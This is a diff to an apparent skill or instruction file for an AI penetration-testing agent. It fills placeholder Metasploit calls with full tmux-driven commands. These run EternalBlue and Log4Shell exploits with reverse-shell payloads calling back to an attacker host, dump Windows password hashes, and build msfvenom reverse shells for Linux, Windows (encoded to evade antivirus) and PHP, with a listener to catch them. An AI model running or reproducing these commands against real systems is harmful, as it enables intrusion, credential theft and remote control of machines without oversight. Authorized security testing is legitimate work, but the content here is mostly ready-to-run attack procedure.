@@ -48,19 +48,27 @@ Read this before executing any workflow phase. Commit to MANDATORY chains before
 
 ### How to invoke Metasploit modules
 
+Drive the persistent `msfconsole` tmux session opened in Phase 0 step 2. Each interaction is two calls: send the module setup + `exploit`/`run`, then capture the output after a sleep that fits the module type.
+
+**Exploit module (with payload):**
 ```
-Bash("msfconsole 10.0.0.5 ...")
+Bash("tmux send-keys -t msf 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit' Enter")
+Bash("sleep 15; tmux capture-pane -t msf -p | tail -40")
 ```
 
-For auxiliary/scanner modules (no payload needed):
+**Auxiliary/scanner module (no payload needed):**
 ```
-Bash("msfconsole 10.0.0.5 ...")
+Bash("tmux send-keys -t msf 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 10.0.0.0/24; run' Enter")
+Bash("sleep 10; tmux capture-pane -t msf -p | tail -40")
 ```
 
-For complex setups, use `extra` for additional `set` commands (semicolon-separated):
+**Complex setup with multiple `set` commands** (chain them with `;` so one tmux send-keys submits the full config):
 ```
-Bash("msfconsole 10.0.0.5 ...")
+Bash("tmux send-keys -t msf 'use exploit/multi/http/log4shell_header_injection; set RHOSTS 10.0.0.5; set RPORT 8080; set TARGETURI /; set HTTP_HEADER X-Api-Version; set LHOST 10.0.0.1; set PAYLOAD java/shell_reverse_tcp; exploit' Enter")
+Bash("sleep 20; tmux capture-pane -t msf -p | tail -60")
 ```
+
+Adjust `sleep` per module — exploits with reverse shells need longer waits than `/24` auxiliary scans. If the capture shows the module still running (no prompt returned), sleep again and re-capture.
 
 ---
 
@@ -115,27 +123,29 @@ Bash("head -30 /tmp/48421.py")                   # review the script
 Bash("python3 /tmp/48421.py --master TARGET")    # run it
 ```
 
-**Then search Metasploit modules:**
+**Then search Metasploit modules** (run inside the tmux session):
 ```
-Bash("msfconsole TARGET ...")
+Bash("tmux send-keys -t msf 'search cve:2017-0144' Enter")
+Bash("sleep 2; tmux capture-pane -t msf -p | tail -20")
 ```
 
 **Or search by service/keyword:**
 ```
-Bash("msfconsole TARGET ...")
+Bash("tmux send-keys -t msf 'search type:exploit platform:windows smb' Enter")
+Bash("sleep 2; tmux capture-pane -t msf -p | tail -30")
 ```
 
 **Always do your own lookup** — the Metasploit database has thousands of modules. Never assume a CVE isn't covered. Use these search strategies:
 
 ```
 # By CVE number (most reliable)
-Bash("msfconsole TARGET ...")
+Bash("tmux send-keys -t msf 'search cve:2021-44228' Enter")
 
 # By service + keyword
-Bash("msfconsole TARGET ...")
+Bash("tmux send-keys -t msf 'search type:exploit smb eternal' Enter")
 
 # By product name
-Bash("msfconsole TARGET ...")
+Bash("tmux send-keys -t msf 'search type:exploit name:saltstack' Enter")
 
 # Also check Exploit-DB (covers non-MSF exploits)
 Bash("searchsploit --cve CVE-2009-3103")
@@ -158,11 +168,15 @@ Bash("searchsploit opensmtpd 2.0")
 
 **Run auxiliary scanner modules to confirm vulnerability without exploiting:**
 ```
-Bash("msfconsole TARGET ...")
+# EternalBlue check (CVE-2017-0144) on a /24
+Bash("tmux send-keys -t msf 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 10.0.0.0/24; run' Enter")
+Bash("sleep 30; tmux capture-pane -t msf -p | tail -40")
 ```
 
 ```
-Bash("msfconsole TARGET ...")
+# Log4Shell check on a single target
+Bash("tmux send-keys -t msf 'use auxiliary/scanner/http/log4shell_scanner; set RHOSTS 10.0.0.5; set RPORT 8080; set TARGETURI /; set LHOST 10.0.0.1; run' Enter")
+Bash("sleep 15; tmux capture-pane -t msf -p | tail -40")
 ```
 
 Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg id 'f-001' --arg title '<title>' --arg sev 'high' --argjson leads '[{\"lead\":\"<x>\",\"status\":\"pending\"}]' '{ts:$ts,type:\"finding\",action:\"add\",id:$id,title:$title,severity:$sev,escalation_leads:$leads}' >> pentest/events.jsonl")` for every confirmed vulnerable service. If depth is `quick`, stop here.
@@ -184,7 +198,9 @@ Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg id 'f-001' --arg title '
 
 **Run the exploit:**
 ```
-Bash("msfconsole TARGET ...")
+Bash("tmux send-keys -t msf 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit' Enter")
+Bash("sleep 30; tmux capture-pane -t msf -p | tail -60")
+# Successful exploit shows 'Meterpreter session 1 opened'. If you see 'Exploit aborted', re-read the capture for the failure mode (host unreachable, payload too big, target patched, wrong target architecture).
 ```
 
 Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg id 'f-001' --arg title '<title>' --arg sev 'high' --argjson leads '[{\"lead\":\"<x>\",\"status\":\"pending\"}]' '{ts:$ts,type:\"finding\",action:\"add\",id:$id,title:$title,severity:$sev,escalation_leads:$leads}' >> pentest/events.jsonl")` with the full Metasploit output as evidence.
@@ -206,14 +222,18 @@ Pre-installed external tools at fixed paths (`/opt/sqlmap/sqlmap.py`, `/opt/jwt_
 
 ### Phase 4 — Post-Exploitation (thorough)
 
-If exploitation succeeds, gather evidence:
+If exploitation succeeds, gather evidence inside the active session:
 ```
-Bash("msfconsole TARGET ...")
+Bash("tmux send-keys -t msf 'sessions -i 1' Enter")
+Bash("tmux send-keys -t msf 'sysinfo; getuid; ipconfig' Enter")
+Bash("sleep 3; tmux capture-pane -t msf -p | tail -40")
 ```
 
-**Meterpreter post modules:**
+**Meterpreter post modules** (run from the meterpreter prompt or via `run post/...`):
 ```
-Bash("msfconsole TARGET ...")
+Bash("tmux send-keys -t msf 'run post/windows/gather/hashdump' Enter")
+Bash("tmux send-keys -t msf 'run post/multi/recon/local_exploit_suggester' Enter")
+Bash("sleep 10; tmux capture-pane -t msf -p | tail -60")
 ```
 
 Chain into `/post-exploit` for full privilege escalation and credential harvesting.
@@ -222,14 +242,22 @@ Chain into `/post-exploit` for full privilege escalation and credential harvesti
 
 ### Phase 5 — Payload Generation (for manual exploitation)
 
-**Generate payloads with msfvenom:**
+**Generate payloads with msfvenom** (run as a regular shell command, no tmux needed):
 ```
-Bash("msfconsole TARGET ...")
+# Linux x64 reverse shell ELF
+Bash("msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/shell")
+
+# Windows x64 reverse shell EXE, encoded to bypass simple AV
+Bash("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -e x64/xor -i 5 -o /tmp/shell.exe")
+
+# PHP web shell
+Bash("msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o /tmp/shell.php")
 ```
-Then use the container directly:
+
+Then start a multi/handler in the tmux session to catch the callback:
 ```
-# Via metasploit container
-Bash("msfconsole TARGET ...")
+Bash("tmux send-keys -t msf 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit -j' Enter")
+Bash("sleep 3; tmux capture-pane -t msf -p | tail -10")
 ```
 
 Or chain into `/reverse-shell` for payload generation with listener setup — it covers all platforms and encodings.
